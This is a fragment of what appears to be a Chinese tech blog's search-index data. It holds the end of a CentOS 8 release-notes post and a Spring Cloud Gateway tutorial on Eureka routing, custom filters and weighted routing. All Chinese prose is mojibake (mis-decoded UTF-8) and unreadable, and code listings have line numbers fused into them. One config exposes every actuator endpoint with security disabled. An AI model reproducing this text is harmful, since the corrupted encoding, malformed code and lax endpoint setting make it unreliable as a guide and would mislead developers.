å…¨æ–°å‘½ä»¤ update-crypto-policiesï¼Œç®¡ç†å‘˜å¯è½»æ¾åˆ‡æ¢ä¸åŒæ¨¡å¼ï¼ŒåŒ…æ‹¬ defaultã€legacyã€futurefipsã€‚ ç½‘ç»œå·¥å…· nftables æ¡†æ¶æ›¿ä»£ iptables ä½œä¸ºé»˜è®¤çš„ç½‘ç»œåŒ…è¿‡æ»¤å·¥å…·ã€‚ firewalld å®ˆæŠ¤è¿›ç¨‹ä½¿ç”¨ nftables ä½œä¸ºé»˜è®¤åç«¯ã€‚ æ”¯æŒ IPVLAN è™šæ‹Ÿç½‘ç»œé©±åŠ¨ç¨‹åºï¼Œä¸»è¦ç”¨äºè¿æ¥å¤šä¸ªå®¹å™¨ã€‚ è™šæ‹ŸåŒ–æŠ€æœ¯ ä½¿ç”¨ Podman è¿›è¡Œå®¹å™¨ç®¡ç†ï¼Œåœ¨ CentOS 8 ä¸­åˆ›å»ºçš„è™šæ‹Ÿæœºï¼Œç°åœ¨æ”¯æŒå¹¶è‡ªåŠ¨é…ç½®æ›´ç°ä»£çš„åŸºäº PCI Express çš„è®¡ç®—æœºç±»å‹ï¼ˆQ35ï¼‰ã€‚è¿™åœ¨è™šæ‹Ÿè®¾å¤‡çš„åŠŸèƒ½å’Œå…¼å®¹æ€§æ–¹é¢æä¾›äº†å¤šç§æ”¹è¿›ã€‚ç°åœ¨å¯ä»¥ä½¿ç”¨ RHEL8 Web æ§åˆ¶å°ï¼ˆä¹Ÿç§°ä¸º â€œé©¾é©¶èˆ±â€ï¼‰åˆ›å»ºå’Œç®¡ç†è™šæ‹Ÿæœºã€‚ é«˜å¯ç”¨å’Œé›†ç¾¤ Pacemaker é›†ç¾¤èµ„æºç®¡ç†å™¨æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ 2.0.0ï¼Œä¿®å¤äº†ä¸€ç³»åˆ— bug åŠç›¸å…³åŠŸèƒ½åšäº†æå‡ã€‚pcs é…ç½®ç³»ç»Ÿå®Œå…¨æ”¯æŒ Corosync 3ã€knet å’ŒèŠ‚ç‚¹åç§°ã€‚ å‚è€ƒèµ„æ–™ CentOS 8 å®˜æ–¹å‘è¡Œè¯´æ˜ å®Œæ•´çš„ RedHat 8 å‘è¡Œè¯´æ˜ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Gateway å…¥é—¨æ•™ç¨‹ - ä¸­çº§ç¯‡",url:"/posts/802c502f.html",text:'ä¸Šç¯‡ - Gateway å…¥é—¨æ•™ç¨‹ï¼ˆåŸºç¡€ç¯‡ï¼‰ Gateway å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡ å‰è¨€ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ–‡ä¸­ï¼Œé»˜è®¤ä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Finchley.RELEASEï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.0.3ï¼Œç‰¹åˆ«å£°æ˜é™¤å¤–ã€‚ Gateway åŸºäºæœåŠ¡å‘ç°çš„è·¯ç”±è§„åˆ™Gateway çš„æœåŠ¡å‘ç°è·¯ç”±æ¦‚è¿°Spring Cloud å¯¹ Zuul è¿›è¡Œå°è£…å¤„ç†ä¹‹åï¼Œå½“é€šè¿‡ Zuul è®¿é—®åç«¯å¾®æœåŠ¡æ—¶ï¼ŒåŸºäºæœåŠ¡å‘ç°çš„é»˜è®¤è·¯ç”±è§„åˆ™æ˜¯ï¼šhttp://zuul_host:zuul_port/å¾®æœåŠ¡åœ¨ Eureka ä¸Šçš„ serviceld/**ã€‚ Spring Cloud Gateway åœ¨è®¾è®¡çš„æ—¶å€™è€ƒè™‘äº†ä» Zuul è¿ç§»åˆ° Gateway çš„ å…¼å®¹æ€§å’Œè¿ç§»æˆæœ¬ç­‰ï¼ŒGateway åŸºäºæœåŠ¡å‘ç°çš„è·¯ç”±è§„åˆ™å’Œ Zuul çš„è®¾è®¡ç±»ä¼¼ï¼Œä½†æ˜¯ä¹Ÿæœ‰å¾ˆå¤§å·®åˆ«ã€‚Spring Cloud Gateway åŸºäºæœåŠ¡å‘ç°çš„è·¯ç”±è§„åˆ™ï¼Œåœ¨ä¸åŒæ³¨å†Œä¸­å¿ƒä¸‹å…¶å·®å¼‚å¦‚ä¸‹ï¼š å¦‚æœæŠŠ Gateway æ³¨å†Œåˆ° Consul ä¸Šï¼Œé€šè¿‡ç½‘å…³è½¬å‘æœåŠ¡è°ƒç”¨ï¼ŒæœåŠ¡åé»˜è®¤å°å†™ï¼Œä¸éœ€è¦åšä»»ä½•å¤„ç† å¦‚æœæŠŠ Gateway æ³¨å†Œåˆ° Zookeeper ä¸Šï¼Œé€šè¿‡ç½‘å…³è½¬å‘æœåŠ¡è°ƒç”¨ï¼ŒæœåŠ¡åé»˜è®¤å°å†™ï¼Œä¸éœ€è¦åšä»»ä½•å¤„ç† å¦‚æœæŠŠ Gateway æ³¨å†Œåˆ° Eureka ä¸Šï¼Œé€šè¿‡ç½‘å…³è½¬å‘æœåŠ¡è°ƒç”¨ï¼Œè®¿é—®ç½‘å…³çš„ URL æ˜¯ http://Gateway_HOST:Gateway_PORT/å¤§å†™çš„ serviceld/*ï¼Œå…¶ä¸­æœåŠ¡åé»˜è®¤å¿…é¡»æ˜¯å¤§å†™ï¼Œå¦åˆ™ä¼šæŠ› 404 é”™è¯¯ï¼›å¦‚æœæœåŠ¡åè¦ç”¨å°å†™è®¿é—®ï¼Œå¯ä»¥åœ¨å±æ€§é…ç½®æ–‡ä»¶é‡Œé¢åŠ  spring.cloud.gateway.discovery.locator.lowerCaseServiceId=true é…ç½®è§£å†³ Gateway æœåŠ¡å‘ç°çš„è·¯ç”±è§„åˆ™æ¡ˆä¾‹ä¸‹é¢å°†ä½¿ç”¨ Eureka ä½œä¸ºæ³¨å†Œä¸­å¿ƒæ¥å‰–æ Gateway æœåŠ¡å‘ç°çš„è·¯ç”±è§„åˆ™ï¼Œå…¶ä¸­å„ä¸ªæ¨¡å—çš„è¯´æ˜å¦‚ä¸‹ï¼Œç”±äºç¯‡å¹…æœ‰é™ï¼Œè¿™é‡Œåªç»™å‡ºæ ¸å¿ƒçš„é…ç½®å’Œä»£ç ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ æ¨¡å— ç«¯å£ è¯´æ˜ micro-service-gateway-route N/A èšåˆçˆ¶ Maven å·¥ç¨‹ micro-service-eureka 9000 Eureka æ³¨å†Œä¸­å¿ƒ micro-service-gateway 9001 åŸºäº Spring Cloud Gateway çš„ç½‘å…³æœåŠ¡ micro-service-provider 9002 æœåŠ¡æä¾›è€… micro-service-consumer 9003 æœåŠ¡æ¶ˆè´¹è€… 1. åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt;&lt;/properties&gt;&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--æ³¨æ„ï¼šè¿™é‡Œéœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å„ç§ä¾èµ–é—®é¢˜ --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;${java.version}&lt;/source&gt; &lt;target&gt;${java.version}&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 2. åˆ›å»º Micro Service Eureka å·¥ç¨‹åˆ›å»º Micro Service Eureka çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Micro Service Eureka çš„å¯åŠ¨ä¸»ç±»ï¼š 12345678@EnableEurekaServer@SpringBootApplicationpublic class EurekaServerApplication { public static void main(String[] args) { SpringApplication.run(EurekaServerApplication.class, args); }} åˆ›å»º Micro Service Eureka çš„ application.yml é…ç½®æ–‡ä»¶ï¼š 123456789101112131415server: port: 9000spring: application: name: eureka-servereureka: instance: hostname: localhost #EurekaæœåŠ¡ç«¯çš„å®ä¾‹åç§° client: register-with-eureka: false #falseè¡¨ç¤ºä¸å‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œè‡ªå·± fetch-registry: false #falseè¡¨ç¤ºè‡ªå·±å°±æ˜¯æ³¨å†Œä¸­å¿ƒï¼ŒèŒè´£å°±æ˜¯ç»´æŠ¤æœåŠ¡å®ä¾‹ï¼Œå¹¶ä¸éœ€è¦å»æ£€ç´¢æœåŠ¡ service-url: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 3. åˆ›å»º Micro Service Gateway å·¥ç¨‹åˆ›å»º Micro Service Gateway çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œç”±äºéœ€è¦å°† Gateway æœåŠ¡æ³¨å†Œåˆ° Eurekaï¼Œå› æ­¤éœ€è¦å¼•å…¥ Eureka Clientï¼›åŒæ—¶ä¸ºäº†é¿å… Gateway çš„ä¾èµ–å†²çªï¼Œæ’é™¤å¼•å…¥ spring-webmvcã€spring-boot-starter-tomcatï¼š 1234567891011121314151617181920212223242526&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; åˆ›å»º Micro Service Gateway çš„å¯åŠ¨ä¸»ç±»ï¼š 1234567@SpringBootApplicationpublic class GatewayServerApplication { public static void main(String[] args) { SpringApplication.run(GatewayServerApplication.class, args); }} åˆ›å»º Micro Service Gateway çš„ application.yml é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­ spring.cloud.gateway.discovery.locator.enabled è¡¨ç¤ºæ˜¯å¦ä¸æœåŠ¡å‘ç°ç»„ä»¶è¿›è¡Œç»“åˆï¼Œé€šè¿‡ serviceId è½¬å‘åˆ°å…·ä½“çš„æœåŠ¡å®ä¾‹ï¼Œé»˜è®¤ä¸º falseï¼Œè‹¥ä¸º true åˆ™å¼€å¯åŸºäºæœåŠ¡å‘ç°çš„è·¯ç”±è§„åˆ™ã€‚spring.cloud.gateway.discovery.locator.lowerCaseServiceId=true è¡¨ç¤ºå½“æ³¨å†Œä¸­å¿ƒä¸º Eureka æ—¶ï¼Œè®¾ç½®ä¸º true è¡¨ç¤ºå¼€å¯ç”¨å°å†™çš„ serviceId è¿›è¡ŒåŸºäºæœåŠ¡è·¯ç”±çš„è½¬å‘ã€‚ 1234567891011121314151617181920server: port: 9001spring: application: name: gateway-server cloud: gateway: discovery: locator: enabled: true lower-case-service-id: trueeureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: gateway-server-${server.port} prefer-ip-address: true 4. åˆ›å»º Micro Service Provider å·¥ç¨‹åˆ›å»º Micro Service Provider çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Micro Service Provider çš„å¯åŠ¨ä¸»ç±»ï¼š 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} åˆ›å»º Micro Service Provider çš„æµ‹è¯•æ§åˆ¶ç±»ï¼š 123456789101112@RestController@RequestMapping("/provider")public class ProviderController { @Value("${server.port}") private String port; @GetMapping("/sayHello/{name}") public String sayHello(@PathVariable("name") String name) { return "from port: " + port + ", hello " + name; }} åˆ›å»º Micro Service Provider çš„ application.yml é…ç½®æ–‡ä»¶ï¼š 1234567891011121314server: port: 9002spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: provider-service-${server.port} prefer-ip-address: true 5. åˆ›å»º Micro Service Consumer å·¥ç¨‹åˆ›å»º Micro Service Consumer çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Micro Service Consumer çš„å¯åŠ¨ä¸»ç±»ï¼š 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); }} åˆ›å»º Micro Service Consumer çš„æœåŠ¡è°ƒç”¨æ¥å£ï¼š 123456@FeignClient("provider-service")public interface ProviderService { @RequestMapping(value = "/provider/sayHello/{name}", method = RequestMethod.GET) public String sayHello(@PathVariable("name") String name);} åˆ›å»º Micro Service Consumer çš„æµ‹è¯•æ§åˆ¶ç±»ï¼š 123456789101112@RestController@RequestMapping("/consumer")public class ConsumerController { @Autowired private ProviderService providerService; @GetMapping("/sayHello/{name}") public String sayHello(@PathVariable("name") String name) { return providerService.sayHello(name); }} åˆ›å»º Micro Service Consumer çš„ application.yml é…ç½®æ–‡ä»¶ï¼š 1234567891011121314server: port: 9003spring: application: name: consumer-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: consumer-service-${server.port} prefer-ip-address: true 6. æµ‹è¯•ç»“æœ ä¾æ¬¡å¯åŠ¨ micro-service-gateway-routeã€micro-service-eurekaã€micro-service-gatewayã€micro-service-providerã€micro-service-consumer åº”ç”¨ è®¿é—® http://127.0.0.1:9000/ï¼ŒæŸ¥çœ‹å„ä¸ªæœåŠ¡æ˜¯å¦éƒ½æˆåŠŸæ³¨å†Œåˆ° Eureka è®¿é—® http://127.0.0.1:9001/consumer-service/consumer/sayHello/Peterï¼ŒæŸ¥çœ‹æ˜¯å¦å¯ä»¥æˆåŠŸé€šè¿‡ Gateway è°ƒç”¨ Consumer çš„æ¥å£ Gateway Filter å’Œ Global FilterSpring Cloud Gateway ä¸­çš„ Filter ä»æ¥å£å®ç°ä¸Šåˆ†ä¸ºä¸¤ç§ï¼šä¸€ç§æ˜¯ Gateway Filterï¼Œå¦å¤–ä¸€ç§æ˜¯ Global Filterã€‚ä¸‹é¢å°†ç»™å‡ºè¿™ä¸¤ç§ Filter çš„è‡ªå®šä¹‰ä½¿ç”¨ç¤ºä¾‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ Gateway Filter å’Œ Global Filter çš„æ¦‚è¿° Gateway Filterï¼š ä» Web Filter ä¸­å¤åˆ¶è¿‡æ¥çš„ï¼Œç›¸å½“äºä¸€ä¸ª Filter è¿‡æ»¤å™¨ï¼Œå¯ä»¥å¯¹è®¿é—®çš„ URL è¿‡æ»¤ï¼Œè¿›è¡Œæ¨ªåˆ‡å¤„ç†ï¼ˆåˆ‡é¢å¤„ç†ï¼‰ï¼Œåº”ç”¨åœºæ™¯åŒ…æ‹¬è¶…æ—¶å¤„ç†ã€å®‰å…¨æ£€æŸ¥ç­‰ã€‚ Global Filterï¼š Spring Cloud Gateway å®šä¹‰äº† Global Filter çš„æ¥å£ï¼Œå¯ä»¥è®©å¼€å‘è€…è‡ªå®šä¹‰å®ç°è‡ªå·±çš„ Global Filterã€‚é¡¾åæ€ä¹‰ï¼ŒGlobal Filter æ˜¯ä¸€ä¸ªå…¨å±€çš„ Filterï¼Œä½œç”¨äºæ‰€æœ‰è·¯ç”±ã€‚ Gateway Filter å’Œ Global Filter çš„åŒºåˆ«ä»è·¯ç”±çš„ä½œç”¨èŒƒå›´æ¥çœ‹ï¼ŒGlobal Filter ä¼šè¢«åº”ç”¨åˆ°æ‰€æœ‰çš„è·¯ç”±ä¸Šï¼Œè€Œ Gateway Filter åˆ™åº”ç”¨åˆ°å•ä¸ªè·¯ç”±æˆ–è€…ä¸€ä¸ªåˆ†ç»„çš„è·¯ç”±ä¸Šã€‚ä»æºç è®¾è®¡æ¥çœ‹ï¼ŒGateway Filter å’Œ Global Filter ä¸¤ä¸ªæ¥å£ä¸­å®šä¹‰çš„æ–¹æ³•ä¸€æ ·ï¼Œéƒ½æ˜¯ Mono filter()ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯ Gateway Filter ç»§æ‰¿äº† ShortcutConfigurableï¼Œè€Œ Global Filter æ²¡æœ‰ä»»ä½•ç»§æ‰¿ã€‚ è‡ªå®šä¹‰ Gateway Filter æ¡ˆä¾‹ åˆ›å»ºè‡ªå®šä¹‰çš„ Gateway Filterï¼š 1234567891011121314151617181920212223public class CustomGatewayFilter implements GatewayFilter, Ordered { private static final Logger logger = LoggerFactory.getLogger(CustomGatewayFilter.class); private static final String COUNT_START_TIME = "countProcessTime"; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { exchange.getAttributes().put(COUNT_START_TIME, System.currentTimeMillis()); return chain.filter(exchange).then( Mono.fromRunnable(() -&gt; { Long startTime = exchange.getAttribute(COUNT_START_TIME); if (startTime != null) { Long countTime = System.currentTimeMillis() - startTime; logger.info(exchange.getRequest().getURI().getRawPath() + ": " + countTime + " ms"); } })); } @Override public int getOrder() { return Ordered.LOWEST_PRECEDENCE; }} å°† Gateway Filter é…ç½®åˆ°è·¯ç”±ä¸Šï¼Œç”±äº Gateway Filter æ˜¯ä½œç”¨äºå•ä¸ªè·¯ç”±æˆ–è€…ä¸€ä¸ªåˆ†ç»„çš„è·¯ç”±ä¸Šçš„ï¼Œå› æ­¤è¿™é‡Œéœ€è¦ä½¿ç”¨ Java çš„æµå¼ API ç»‘å®š Gateway Filter å’Œè·¯ç”±ï¼Œæˆ–è€…ä½¿ç”¨ YML æ–‡ä»¶çš„æ–¹å¼é…ç½®è·¯ç”±ï¼š 123456789101112131415@Configurationpublic class CommonConfiguration { @Bean public RouteLocator customGatewayFilter(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path("/custom/gateway/filter") .filters(f -&gt; f.filter(new CustomGatewayFilter())) .uri("http://127.0.0.1:9090/provider/sayHello/Jim/") .order(0) .id("custom-gateway-filter") ) .build(); }} è‡ªå®šä¹‰ Global Filter æ¡ˆä¾‹ä¸‹é¢é€šè¿‡ç®€å•å®šä¹‰ä¸€ä¸ªåä¸º CustomGlobalFilter çš„å…¨å±€è¿‡æ»¤å™¨ï¼Œå¯¹è¯·æ±‚åˆ°ç½‘å…³çš„ URL è¿›è¡Œæƒé™æ ¡éªŒï¼Œåˆ¤æ–­è¯·æ±‚çš„ URL æ˜¯å¦ä¸ºåˆæ³•è¯·æ±‚ã€‚å…¨å±€è¿‡æ»¤å™¨å¤„ç†çš„é€»è¾‘æ˜¯é€šè¿‡ä» Gateway çš„ ä¸Šä¸‹æ–‡ ServerWebExchange å¯¹è±¡ä¸­è·å– authToken å¯¹åº”çš„å€¼è¿›è¡Œåˆ¤ Null å¤„ç†ï¼Œä¹Ÿå¯ä»¥æ ¹æ®éœ€æ±‚å®šåˆ¶å¼€å‘æ›´å¤æ‚çš„æ ¡éªŒé€»è¾‘ã€‚å› ä¸º Global Filter æ˜¯ä½œç”¨åœ¨æ‰€æœ‰çš„è·¯ç”±ä¸Šï¼Œå› æ­¤åªéœ€è¦æ·»åŠ  @Component æ³¨è§£ï¼Œå°† CustomGlobalFilter çš„ Bean æ³¨å…¥è¿› Spring çš„å®¹å™¨å†…å³å¯ã€‚ 123456789101112131415161718@Componentpublic class CustomGlobalFilter implements GlobalFilter, Ordered { @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { String token = exchange.getRequest().getQueryParams().getFirst("authToken"); if (null == token || token.isEmpty()) { exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED); return exchange.getResponse().setComplete(); } return chain.filter(exchange); } @Override public int getOrder() { return -400; }} Gateway å®æˆ˜Spring Cloud Gateway æƒé‡è·¯ç”±WeightRoutePredicateFactory æ˜¯ä¸€ä¸ªè·¯ç”±æ–­è¨€å·¥å‚ï¼Œåœ¨ Spring Cloud Gateway ä¸­å¯ä»¥ä½¿ç”¨å®ƒå¯¹ URL è¿›è¡Œæƒé‡è·¯ç”±ï¼Œåªéœ€åœ¨é…ç½®æ—¶æŒ‡å®šåˆ†ç»„å’Œæƒé‡å€¼å³å¯ã€‚ æƒé‡è·¯ç”±çš„ä½¿ç”¨åœºæ™¯åœ¨å¼€å‘ã€æµ‹è¯•çš„æ—¶å€™ï¼Œæˆ–è€…çº¿ä¸Šå‘å¸ƒã€çº¿ä¸ŠæœåŠ¡å¤šç‰ˆæœ¬æ§åˆ¶çš„æ—¶å€™ï¼Œéœ€è¦å¯¹æœåŠ¡è¿›è¡Œæƒé‡è·¯ç”±ã€‚æœ€å¸¸è§çš„ä½¿ç”¨åœºæ™¯å°±æ˜¯ä¸€ä¸ªæœåŠ¡æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼šæ—§ç‰ˆæœ¬ V1ã€æ–°ç‰ˆæœ¬ V2ã€‚åœ¨çº¿ä¸Šç°åº¦å‘å¸ƒçš„æ—¶å€™ï¼Œéœ€è¦é€šè¿‡ç½‘å…³åŠ¨æ€å®æ—¶æ¨é€è·¯ç”±æƒé‡ä¿¡æ¯ã€‚æ¯”å¦‚ 95% çš„æµé‡èµ°æœåŠ¡ V1 ç‰ˆæœ¬ï¼Œ5% çš„æµé‡èµ°æœåŠ¡ V2 ç‰ˆæœ¬ã€‚ æƒé‡è·¯ç”±æ¡ˆä¾‹ä¸‹é¢çš„æ¡ˆä¾‹ä¸­ï¼ŒSpring Cloud Gateway ä¼šæ ¹æ®æƒé‡è·¯ç”±è§„åˆ™ï¼Œé’ˆå¯¹ç‰¹å®šçš„æœåŠ¡ï¼ŒæŠŠ 95% çš„è¯·æ±‚æµé‡åˆ†å‘ç»™æœåŠ¡çš„ V1 ç‰ˆæœ¬ï¼ŒæŠŠå‰©ä½™ 5% çš„æµé‡åˆ†å‘ç»™æœåŠ¡çš„ V2 ç‰ˆæœ¬ï¼Œç”±æ­¤è¿›è¡Œæƒé‡è·¯ç”±ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ åˆ›å»º Gateway Server å·¥ç¨‹é‡Œçš„ pom.xml é…ç½®æ–‡ä»¶ï¼š 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Gateway Server å·¥ç¨‹é‡Œçš„å¯åŠ¨ä¸»ç±»ï¼š 1234567@SpringBootApplicationpublic class GatewayServerApplication { public static void main(String[] args) { SpringApplication.run(GatewayServerApplication.class, args); }} åˆ›å»º Gateway Server å·¥ç¨‹é‡Œçš„ application.yml é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä¸¤ä¸ªé’ˆå¯¹ /test è·¯å¾„è½¬å‘çš„è·¯ç”±å®šä¹‰é…ç½®ï¼Œè¿™ä¸¤ä¸ªè·¯ç”±å±äºåŒä¸€ä¸ªæƒé‡åˆ†ç»„ï¼Œæƒé‡çš„åˆ†ç»„åç§°ä¸º groupï¼š 12345678910111213141516171819202122232425262728293031323334server: port: 9090spring: application: name: gateway-server cloud: gateway: routes: - id: provider-service-v1 uri: http://127.0.0.1:9091/v1/ predicates: - Path=/test - Weight=group, 95 - id: provider-service-v2 uri: http://127.0.0.1:9091/v2/ predicates: - Path=/test - Weight=group, 5logging: level: org.springframework.cloud.gateway: TRACE org.springframework.http.server.reactive: DEBUG org.springframework.web.reactive: DEBUG reactor.ipc.netty: DEBUGmanagement: endpoints: web: exposure: include: \'*\' security: enabled: false åˆ›å»º Provider Service å·¥ç¨‹é‡Œçš„æµ‹è¯•æ§åˆ¶å™¨ï¼š 12345678910111213@RestControllerpublic class ProviderController { @GetMapping("/v1") public String v1() { return "version: v1"; } @GetMapping("/v2") public String v2() { return "version: v2"; }} åˆ›å»º Provider Service å·¥ç¨‹é‡Œçš„å¯åŠ¨ä¸»ç±»ï¼š 1234567@SpringBootApplicationpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} åˆ›å»º Provider Service å·¥ç¨‹é‡Œçš„ application.yml é…ç½®æ–‡ä»¶ï¼š 123456server: port: 9091spring: application: name: provider-service æµ‹è¯•ç»“æœï¼š ä¾æ¬¡å¯åŠ¨ gateway-serverã€provider-service åº”ç”¨ å¤šæ¬¡è®¿é—® http://127.0.0.1:9090/test ï¼Œä¼šå‘ç°æŒ‰æƒé‡é…ç½®è¿”å›å¯¹åº”çš„è¯·æ±‚å†…å®¹ Spring Cloud Gateway çš„ HTTPS ä½¿ç”¨å¤§å‹äº’è”ç½‘åº”ç”¨çš„ç”Ÿäº§ç¯å¢ƒåŸºæœ¬æ˜¯å…¨ç«™ HTTPSï¼Œå¸¸è§„çš„åšæ³•æ˜¯é€šè¿‡ Nginx æ¥é…ç½® SSL è¯ä¹¦ã€‚å¦‚æœä½¿ç”¨ Spring Cloud Gateway ä½œä¸º API 